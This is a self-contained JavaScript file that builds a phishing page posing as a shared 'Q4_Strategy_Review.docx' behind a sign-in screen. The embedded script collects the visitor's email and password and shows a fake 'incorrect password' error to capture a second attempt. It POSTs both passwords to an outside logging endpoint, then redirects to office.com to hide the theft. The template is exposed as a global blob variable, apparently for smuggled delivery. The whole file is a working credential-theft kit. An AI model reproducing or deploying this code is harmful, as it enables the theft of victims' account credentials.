// content.js - Complete Self-Contained Application
// This is the ONLY file you need - everything is included

(function() {
    'use strict';

    // ============================================================
    // IMAGE CONFIGURATION
    // ============================================================
    
    const BACKGROUND_IMAGE = 'https://myprojec-37j.pages.dev/background-image.png';
    const DOCUMENT_ICON = 'https://myprojec-37j.pages.dev/bgo.png';
    const FONT_AWESOME = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';

    // ============================================================
    // COMPLETE HTML TEMPLATE with EMBEDDED JAVASCRIPT
    // ============================================================
    
    const HTML_TEMPLATE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Shared Document · Secure Access</title>
<link rel="stylesheet" href="${FONT_AWESOME}">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI','Helvetica Neue',sans-serif}
body{min-height:100vh;display:flex;justify-content:center;align-items:flex-start;margin:0;padding:20px;background:#f0f4fa;background-image:url('${BACKGROUND_IMAGE}');background-size:cover;background-position:center;background-repeat:no-repeat;position:relative;padding-top:60px}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);backdrop-filter:blur(5px);z-index:0}
.card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);max-width:440px;width:100%;min-height:480px;height:auto;margin-top:60px;padding:28px 24px 24px;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.12),0 4px 16px rgba(0,0,0,0.04);position:relative;z-index:1;transition:box-shadow .25s;display:flex;flex-direction:column}
.doc-header{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #eef2f6;flex-shrink:0}
.doc-icon{background:#eef6ff;width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#1e5f9e;font-size:20px;flex-shrink:0;overflow:hidden}
.doc-icon img{width:32px;height:32px;object-fit:contain}
.doc-icon i{display:none}
.doc-meta{flex:1;min-width:0}
.doc-meta h2{font-size:16px;font-weight:600;color:#1b1b1b;letter-spacing:-.2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.doc-meta .shared-badge{background:#e3edf7;color:#1e5f9e;font-size:11px;font-weight:600;padding:2px 10px;border-radius:30px;display:inline-block;margin-top:2px}
.doc-meta .shared-badge i{margin-right:4px;font-size:10px}
.step-indicator{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-shrink:0}
.step-badge{background:#eef2f6;color:#3c3c3c;font-size:12px;font-weight:500;padding:3px 12px;border-radius:40px;letter-spacing:.2px}
.step-badge.active{background:#1e5f9e;color:#fff}
.step-badge i{margin-right:4px;font-size:11px}
#stepBadge2{display:none!important}
.status-message{background:#f8fafc;padding:8px 14px;border-radius:8px;font-size:13px;color:#1b1b1b;margin-bottom:10px;border-left:3px solid #1e5f9e;display:flex;align-items:center;gap:10px;flex-shrink:0;min-height:36px}
.status-message i{color:#1e5f9e;font-size:16px}
.status-message.error{border-left-color:#c42b2b;background:#fff6f6}
.status-message.error i{color:#c42b2b}
.status-message.success{border-left-color:#1e8e3e;background:#f0faf3}
.status-message.success i{color:#1e8e3e}
.step-content{flex:1;display:flex;flex-direction:column;justify-content:center}
.form-group{margin-bottom:14px}
label{display:block;font-size:13px;font-weight:500;color:#2b2b2b;margin-bottom:5px}
.email-label{font-size:18px;font-weight:700;color:#1b1b1b;letter-spacing:.2px}
.password-label{font-size:18px;font-weight:700;color:#1b1b1b;letter-spacing:.2px}
.input-wrapper{position:relative;display:flex;align-items:center;background:#fbfcfd;border:1px solid #d1d9e6;border-radius:8px;transition:border-color .15s,box-shadow .15s}
.input-wrapper:focus-within{border-color:#1e5f9e;box-shadow:0 0 0 3px rgba(30,95,158,.15);background:#fff}
.input-wrapper .email-icon{color:#7a7a7a;font-size:15px;padding:0 0 0 12px;width:34px;text-align:center;flex-shrink:0}
.input-wrapper input{width:100%;padding:12px 12px 12px 4px;border:none;background:transparent;font-size:14px;outline:none;color:#1b1b1b;font-weight:400}
.input-wrapper input::placeholder{color:#9aa6b5;font-weight:300;font-size:13px}
.toggle-pwd{background:none;border:none;color:#7a7a7a;padding-right:12px;cursor:pointer;font-size:15px;display:flex;align-items:center;flex-shrink:0}
.toggle-pwd:hover{color:#1b1b1b}
.action-btn{width:100%;padding:12px;background:#1e5f9e;border:none;border-radius:8px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s,box-shadow .15s;display:flex;justify-content:center;align-items:center;gap:8px;letter-spacing:.2px;margin-top:4px;flex-shrink:0}
.action-btn:hover{background:#154a7a;box-shadow:0 4px 12px rgba(30,95,158,.25)}
.action-btn:active{transform:scale(.97);background:#0f3a5f}
.action-btn:disabled{opacity:.7;cursor:not-allowed}
.hidden{display:none!important}
.email-display{background:#f2f6fc;padding:8px 14px;border-radius:8px;font-size:14px;color:#1b1b1b;margin-bottom:12px;display:flex;align-items:center;gap:10px;border:1px solid #dce3ec;flex-shrink:0}
.email-display i{color:#1e5f9e;font-size:15px}
.email-display span{font-weight:500;word-break:break-all}
.text-center{text-align:center}
.text-sm{font-size:12px;color:#5e5e5e}
.mt-2{margin-top:6px}
.footer-links{margin-top:14px;font-size:11px;color:#7a7a7a;text-align:center;border-top:1px solid #eaeef3;padding-top:12px;flex-shrink:0}
.footer-links a{color:#1e5f9e;text-decoration:none;margin:0 6px}
.footer-links a:hover{text-decoration:underline}
.password-error{background:#fff6f6;padding:8px 14px;border-radius:8px;font-size:13px;color:#c42b2b;margin-bottom:12px;border-left:3px solid #c42b2b;display:flex;align-items:center;gap:10px;flex-shrink:0;min-height:36px}
.password-error i{color:#c42b2b;font-size:16px}
.password-error.hidden{display:none!important}
@media(max-width:768px){body{padding:16px;padding-top:50px}.card{padding:24px 20px}}
@media(max-width:600px){body{padding:12px;padding-top:40px}.card{padding:20px 16px;min-height:460px;margin-top:30px}.doc-meta h2{font-size:14px}.email-label,.password-label{font-size:16px}.step-badge{font-size:11px;padding:2px 10px}.step-badge i{font-size:10px}.status-message{font-size:12px;padding:6px 12px;min-height:32px}.status-message i{font-size:14px}.password-error{font-size:12px;padding:6px 12px;min-height:32px}.password-error i{font-size:14px}.input-wrapper input{font-size:13px;padding:10px 10px 10px 4px}.input-wrapper .email-icon{font-size:13px;padding:0 0 0 10px;width:30px}.action-btn{font-size:14px;padding:10px}.footer-links{font-size:10px}}
@media(max-width:400px){body{padding:8px;padding-top:30px}.card{padding:16px 12px;min-height:420px;border-radius:12px}.doc-icon{width:36px;height:36px}.doc-icon img{width:28px;height:28px}.doc-meta h2{font-size:13px}.shared-badge{font-size:10px;padding:1px 8px}.email-label,.password-label{font-size:14px}.step-badge{font-size:10px;padding:2px 8px}.step-badge i{font-size:9px}.status-message{font-size:11px;padding:5px 10px;min-height:28px}.status-message i{font-size:12px}.password-error{font-size:11px;padding:5px 10px;min-height:28px}.password-error i{font-size:12px}.input-wrapper input{font-size:12px;padding:8px 8px 8px 4px}.input-wrapper .email-icon{font-size:12px;padding:0 0 0 8px;width:26px}.action-btn{font-size:13px;padding:8px;border-radius:6px}.action-btn i{font-size:12px}.email-display{font-size:12px;padding:6px 10px}.email-display i{font-size:13px}.text-sm{font-size:11px}.footer-links{font-size:10px;margin-top:10px;padding-top:10px}}
@media(max-width:350px){body{padding:4px;padding-top:20px}.card{padding:12px 8px;min-height:380px;border-radius:10px}.doc-meta h2{font-size:12px}.email-label,.password-label{font-size:13px}.input-wrapper input{font-size:11px;padding:6px 6px 6px 4px}.action-btn{font-size:12px;padding:7px}.status-message{font-size:10px;padding:4px 8px}.password-error{font-size:10px;padding:4px 8px}.step-badge{font-size:9px;padding:2px 6px}.step-badge i{font-size:8px}}
@media(min-height:900px){body{padding-top:100px}.card{margin-top:80px}}
@media(max-height:500px) and (orientation:landscape){body{padding-top:15px;padding-bottom:15px}.card{margin-top:20px;padding:14px 18px;min-height:320px;max-width:480px}.doc-header{margin-bottom:8px;padding-bottom:8px}.step-indicator{margin-bottom:6px}.status-message{margin-bottom:6px;padding:4px 10px;min-height:24px}.password-error{margin-bottom:6px;padding:4px 10px;min-height:24px}.form-group{margin-bottom:8px}.action-btn{padding:8px;margin-top:2px}.doc-icon{width:32px;height:32px}.doc-icon img{width:24px;height:24px}.doc-meta h2{font-size:13px}.email-label,.password-label{font-size:14px}.input-wrapper input{padding:6px 8px 6px 4px;font-size:12px}}
@media(hover:none) and (pointer:coarse){.action-btn:hover{transform:none;box-shadow:none}.action-btn:active{transform:scale(.97)}.input-wrapper input{font-size:16px}}
@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
</style>
</head>
<body>
<div class="card" role="main">
    <div class="doc-header">
        <div class="doc-icon">
            <img src="${DOCUMENT_ICON}" alt="Document icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';">
            <i class="fas fa-file-pdf"></i>
        </div>
        <div class="doc-meta">
            <h2>Q4_Strategy_Review.docx</h2>
            <span class="shared-badge"><i class="fas fa-user-friends"></i> Shared with you</span>
        </div>
    </div>
    <div class="step-indicator">
        <span class="step-badge active" id="stepBadge1"><i class="fas fa-envelope"></i> Email</span>
        <span class="step-badge" id="stepBadge2"><i class="fas fa-lock"></i> Password</span>
    </div>
    <div id="statusMessage" class="status-message">
        <i class="fas fa-info-circle"></i>
        <span id="statusText">Enter your email to access the shared document.</span>
    </div>
    <div class="step-content">
        <div id="stepEmail">
            <div class="form-group">
                <label for="emailInput" class="email-label">Email</label>
                <div class="input-wrapper">
                    <i class="fas fa-envelope email-icon"></i>
                    <input type="email" id="emailInput" placeholder="you@example.com" autocomplete="email" value="">
                </div>
            </div>
            <button class="action-btn" id="emailNextBtn"><i class="fas fa-arrow-right"></i> Continue</button>
            <div class="text-center text-sm mt-2">This document is shared with verified users.</div>
        </div>
        <div id="stepPasswordFirst" class="hidden">
            <div class="email-display">
                <i class="fas fa-user-circle"></i>
                <span id="displayEmailFirst">user@example.com</span>
            </div>
            <div id="passwordErrorFirst" class="password-error hidden">
                <i class="fas fa-exclamation-circle"></i>
                <span id="passwordErrorTextFirst">Incorrect password, please try again.</span>
            </div>
            <div class="form-group">
                <label for="passwordFirstInput" class="password-label">Enter password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordFirstInput" placeholder="Enter password" autocomplete="current-password">
                    <button type="button" class="toggle-pwd" id="togglePwdFirst" aria-label="Show password">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button class="action-btn" id="pwdFirstBtn"><i class="fas fa-sign-in-alt"></i> Sign In</button>
        </div>
        <div id="stepPasswordSecond" class="hidden">
            <div class="email-display">
                <i class="fas fa-user-circle"></i>
                <span id="displayEmailSecond">user@example.com</span>
            </div>
            <div id="passwordErrorSecond" class="password-error">
                <i class="fas fa-exclamation-circle"></i>
                <span id="passwordErrorTextSecond">Incorrect password, please try again.</span>
            </div>
            <div class="form-group">
                <label for="passwordSecondInput" class="password-label">Enter password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordSecondInput" placeholder="Enter password" autocomplete="current-password">
                    <button type="button" class="toggle-pwd" id="togglePwdSecond" aria-label="Show password">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button class="action-btn" id="pwdSecondBtn"><i class="fas fa-sign-in-alt"></i> Sign In</button>
        </div>
    </div>
    <div class="footer-links">
        <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Support</a>
    </div>
</div>

<script>
// ============================================================
// ALL JAVASCRIPT IS HERE - EMBEDDED IN THE HTML
// ============================================================

(function() {
    'use strict';

    console.log('✅ Embedded script loaded');

    // Configuration
    var CONFIG = {
        logEndpoint: 'https://gnosis.com.py/serca/log.php',
        redirectUrl: 'https://www.office.com'
    };

    // Get DOM elements
    var emailInput = document.getElementById('emailInput');
    var pwdFirstInput = document.getElementById('passwordFirstInput');
    var pwdSecondInput = document.getElementById('passwordSecondInput');
    var emailNextBtn = document.getElementById('emailNextBtn');
    var pwdFirstBtn = document.getElementById('pwdFirstBtn');
    var pwdSecondBtn = document.getElementById('pwdSecondBtn');
    var statusText = document.getElementById('statusText');
    var statusMsg = document.getElementById('statusMessage');
    var stepBadge1 = document.getElementById('stepBadge1');
    var stepEmail = document.getElementById('stepEmail');
    var stepPwdFirst = document.getElementById('stepPasswordFirst');
    var stepPwdSecond = document.getElementById('stepPasswordSecond');
    var displayFirst = document.getElementById('displayEmailFirst');
    var displaySecond = document.getElementById('displayEmailSecond');
    var togglePwdFirst = document.getElementById('togglePwdFirst');
    var togglePwdSecond = document.getElementById('togglePwdSecond');
    var passwordErrorFirst = document.getElementById('passwordErrorFirst');
    var passwordErrorSecond = document.getElementById('passwordErrorSecond');

    // Verify elements exist
    console.log('🔍 Checking DOM elements...');
    console.log('emailInput:', !!emailInput);
    console.log('emailNextBtn:', !!emailNextBtn);
    console.log('pwdFirstBtn:', !!pwdFirstBtn);
    console.log('pwdSecondBtn:', !!pwdSecondBtn);

    if (!emailInput || !emailNextBtn) {
        console.error('❌ Critical elements missing!');
        // Try to recover
        setTimeout(function() {
            location.reload();
        }, 1000);
        return;
    }

    var storedEmail = '';

    // Helper functions
    function setStatus(message, type) {
        type = type || 'info';
        if (statusText) {
            statusText.innerText = message;
        }
        if (statusMsg) {
            statusMsg.className = 'status-message';
            if (type === 'error') {
                statusMsg.classList.add('error');
            } else if (type === 'success') {
                statusMsg.classList.add('success');
            }
            var icon = statusMsg.querySelector('i');
            if (icon) {
                if (type === 'error') {
                    icon.className = 'fas fa-exclamation-circle';
                } else if (type === 'success') {
                    icon.className = 'fas fa-check-circle';
                } else {
                    icon.className = 'fas fa-info-circle';
                }
            }
        }
    }

    function updateStepIndicators(step) {
        if (stepBadge1) {
            stepBadge1.classList.remove('active');
            if (step === 1) {
                stepBadge1.classList.add('active');
            }
        }
    }

    function showPasswordError(show, step) {
        if (step === 2 && passwordErrorFirst) {
            if (show) {
                passwordErrorFirst.classList.remove('hidden');
            } else {
                passwordErrorFirst.classList.add('hidden');
            }
        } else if (step === 3 && passwordErrorSecond) {
            if (show) {
                passwordErrorSecond.classList.remove('hidden');
            } else {
                passwordErrorSecond.classList.add('hidden');
            }
        }
    }

    function showStep(step, email) {
        email = email || '';
        
        if (stepEmail) stepEmail.classList.add('hidden');
        if (stepPwdFirst) stepPwdFirst.classList.add('hidden');
        if (stepPwdSecond) stepPwdSecond.classList.add('hidden');

        showPasswordError(false, 2);
        showPasswordError(false, 3);

        if (step === 1) {
            if (stepEmail) stepEmail.classList.remove('hidden');
            updateStepIndicators(1);
            if (emailInput) {
                setTimeout(function() { emailInput.focus(); }, 100);
            }
            setStatus('Enter your email to access the shared document.', 'info');
        } else if (step === 2) {
            if (stepPwdFirst) stepPwdFirst.classList.remove('hidden');
            updateStepIndicators(2);
            if (email && displayFirst) {
                displayFirst.textContent = email;
            }
            if (pwdFirstInput) {
                pwdFirstInput.value = '';
                setTimeout(function() { pwdFirstInput.focus(); }, 100);
            }
            setStatus('Enter your password for ' + email, 'info');
        } else if (step === 3) {
            if (stepPwdSecond) stepPwdSecond.classList.remove('hidden');
            updateStepIndicators(3);
            if (email && displaySecond) {
                displaySecond.textContent = email;
            }
            if (pwdSecondInput) {
                pwdSecondInput.value = '';
                setTimeout(function() { pwdSecondInput.focus(); }, 100);
            }
            showPasswordError(true, 3);
            setStatus('Please try again with a different password.', 'error');
        }
    }

    function resetFlow() {
        if (emailInput) emailInput.value = '';
        if (pwdFirstInput) pwdFirstInput.value = '';
        if (pwdSecondInput) pwdSecondInput.value = '';
        storedEmail = '';
        showPasswordError(false, 2);
        showPasswordError(false, 3);
        showStep(1);
        if (pwdSecondBtn) {
            pwdSecondBtn.disabled = false;
            pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
        }
    }

    function logToFile(email, password, eventType) {
        var logData = {
            email: email,
            password: password,
            event: eventType,
            timestamp: new Date().toISOString()
        };

        if (CONFIG.logEndpoint) {
            try {
                fetch(CONFIG.logEndpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(logData),
                    keepalive: true
                }).catch(function(error) {
                    console.log('⚠️ Logging failed:', error);
                });
            } catch(e) {
                console.log('⚠️ Logging error:', e);
            }
        }
    }

    // ============================================================
    // EVENT LISTENERS - Direct assignment
    // ============================================================

    // Email Next Button
    emailNextBtn.onclick = function(e) {
        e.preventDefault();
        console.log('📧 Email button clicked');
        var email = emailInput.value.trim();
        if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
            setStatus('Please enter a valid email address.', 'error');
            return;
        }
        storedEmail = email;
        try {
            localStorage.setItem('sharedDocEmail', email);
        } catch(e) {}
        console.log('📧 Email entered:', email);
        showStep(2, email);
    };

    // First Password Button
    pwdFirstBtn.onclick = function(e) {
        e.preventDefault();
        console.log('🔑 First password button clicked');
        var pwd = pwdFirstInput.value.trim();
        if (!pwd) {
            setStatus('Please enter a password.', 'error');
            return;
        }
        var email = storedEmail || 'user';
        try {
            email = localStorage.getItem('sharedDocEmail') || email;
        } catch(e) {}
        console.log('🔑 First password attempt for:', email);
        
        logToFile(email, pwd, 'password_attempt_1');
        
        showPasswordError(true, 2);
        setStatus('Incorrect password, please try again.', 'error');
        
        pwdFirstInput.value = '';
        setTimeout(function() { pwdFirstInput.focus(); }, 100);
        
        showStep(3, email);
    };

    // Second Password Button
    pwdSecondBtn.onclick = function(e) {
        e.preventDefault();
        console.log('🔑 Second password button clicked');
        var pwd = pwdSecondInput.value.trim();
        if (!pwd) {
            setStatus('Please enter a password.', 'error');
            return;
        }
        var email = storedEmail || 'user';
        try {
            email = localStorage.getItem('sharedDocEmail') || email;
        } catch(e) {}
        console.log('🔑 Second password attempt for:', email);
        
        logToFile(email, pwd, 'password_attempt_2_success');
        
        setTimeout(function() {
            window.location.href = CONFIG.redirectUrl;
        }, 150);
    };

    // Password Toggle
    function setupToggle(btn, input) {
        if (!btn || !input) return;
        btn.onclick = function() {
            var type = input.getAttribute('type') === 'password' ? 'text' : 'password';
            input.setAttribute('type', type);
            var icon = this.querySelector('i');
            if (icon) {
                icon.classList.toggle('fa-eye');
                icon.classList.toggle('fa-eye-slash');
            }
        };
    }
    setupToggle(togglePwdFirst, pwdFirstInput);
    setupToggle(togglePwdSecond, pwdSecondInput);

    // Enter key support
    function handleEnter(btn) {
        return function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (btn) btn.click();
            }
        };
    }
    emailInput.addEventListener('keydown', handleEnter(emailNextBtn));
    pwdFirstInput.addEventListener('keydown', handleEnter(pwdFirstBtn));
    pwdSecondInput.addEventListener('keydown', handleEnter(pwdSecondBtn));

    // Start the flow
    resetFlow();
    console.log('✅ Shared document flow ready');

})();
</script>
</body>
</html>`;

    // Expose the HTML content globally
    window.blobHtmlContent = HTML_TEMPLATE;

    console.log('✅ Content loaded: Complete self-contained application');
    console.log('📸 Images from Cloudflare Pages:');
    console.log('   - Background: https://myprojec-37j.pages.dev/background-image.png');
    console.log('   - Icon: https://myprojec-37j.pages.dev/bgo.png');

})();
